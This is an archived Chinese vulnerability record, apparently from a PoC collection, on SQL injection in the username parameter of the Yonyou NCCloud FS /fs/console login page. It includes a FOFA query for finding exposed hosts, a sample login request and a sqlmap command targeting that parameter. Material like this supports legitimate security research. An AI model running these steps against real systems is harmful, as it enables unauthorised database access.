---
source: "MrWQ/vulnerability-paper"
title: "用友NCCloud FS fs/console username SQL 注入"
product: "用友NCCloud FS"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本"
prerequisites: "登录入口但示例重复JSESSIONID，未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/jb7XeLGvdyNrF1xQFsXDjA"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BNC/X%20%E5%8F%8B%20NCCloud%20FS%20%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%20SQL%20%E6%B3%A8%E5%85%A5.md"
fofa_unverified: "NCCloud"
id: "vw-4ab845edb58d57acbdd109ca"
entity_id: "ve-4ab845edb58d57acbdd109ca"
schema_version: "1"
---

# 用友NCCloud FS fs/console username SQL 注入

## 条目说明

- 对象与具体问题：用友NCCloud FS；fs/console username SQLi
- 版本、配置及部署条件：无版本
- 认证与权限前提：登录入口但示例重复JSESSIONID，未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 只有正常请求+sqlmap调用，注入类型/原始响应/根因只图
- Cookie重复且密码固定编码来源不明，不能默认必要
- NCCloud应与NC子产品字段区分；无修复build，去推广

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/jb7XeLGvdyNrF1xQFsXDjA)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7f0qibYGLgIyO0zpTSeV1I6m1WibjS1ggK9xf8lYM44SK40O6uRLTOAtiaM0xYOqZicJ2oDdiaWFianIjQ/640?wx_fmt=png)**

**一****：漏洞描述🐑**

**用友 NCCloud FS 文件管理登录页面对用户名参数没有过滤，存在 SQL 注入**

**二:  漏洞影响🐇**

**用友 NCCloud**

**三:  漏洞复现🐋**

```
FOFA "NCCloud"
```

**登录页面如下**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5iaY2lic4SJgQRhsPWjR41mmCpgjFoDgTNHthDhaUDAS6JvIZ5zPS9Yhhthbb3t9kyyXRqKibEo1diaQ/640?wx_fmt=png)

**在应用中存在文件服务器管理登录页面**  

```
http://xxx.xxx.xxx.xxx/fs/
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5iaY2lic4SJgQRhsPWjR41mmWkGZJLeey1GNGMAprdopzSSYsJ9jJEdiaCI27xCmSibial79MD3uokOkg/640?wx_fmt=png)

**登录请求包如下**

```http
GET /fs/console?username=123&password=%2F7Go4Iv2Xqlml0WjkQvrvzX%2FgBopF8XnfWPUk69fZs0%3D HTTP/1.1
Host: xxx.xxx.xxx.xxx
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: JSESSIONID=2CF7A25EE7F77A064A9DA55456B6994D.server; JSESSIONID=0F83D6A0F3D65B8CD4C26DFEE4FCBC3C.ser
Connection: close
```

**使用 Sqlmap 对 **username 参数** 进行 SQL 注入**

```
sqlmap -r sql.txt -p username
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5iaY2lic4SJgQRhsPWjR41mmQ11KDar2tiaHBtnNQIbN0pjBcpmPicEW7pbVLwArvRSEiagXKDnUlDW3g/640?wx_fmt=png)

 ****四:  关于文库🦉****

**在线文库：**

**http://wiki.peiqi.tech**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5iaY2lic4SJgQRhsPWjR41mmvfI5iaWc3vnKX1V2RQeXnCoLUaHMsjxxhuUc3K2wu9v5DmRW0MhXmrw/640?wx_fmt=png)

**Github：**

**https://github.com/PeiQi0/PeiQi-WIKI-POC**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5iaY2lic4SJgQRhsPWjR41mmeShfVkfwQS8Oet0CwZ4pagFfNNcia9s6g4bSEIibEukYyRQzR6WVia4eg/640?wx_fmt=png)

最后
--

> 下面就是文库的公众号啦，更新的文章都会在第一时间推送在交流群和公众号
> 
> 想要加入交流群的师傅公众号点击交流群加我拉你啦~
> 
> 别忘了 Github 下载完给个小星星⭐

公众号

**同时知识星球也开放运营啦，希望师傅们支持支持啦🐟**

**知识星球里会持续发布一些漏洞公开信息和技术文章~**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5iaY2lic4SJgQRhsPWjR41mm6ndgMqZlfq7MQ5H27d7lZlWEVG4VEGJjteefhdpJqqWaNR0JBNibjLQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5iaY2lic4SJgQRhsPWjR41mmXickEs50QRGo5geOBjIBOlbeTOic9GvR3hGBvFsgibgP2FGplVQBr2yIQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5iaY2lic4SJgQRhsPWjR41mmNwJOPmSFkgjk0tAuSP3kHryDjyUia6Zfia1tmPVD2ibYALahPVicmFXopQ/640?wx_fmt=png)  

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

**PeiQi 文库 拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。**

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
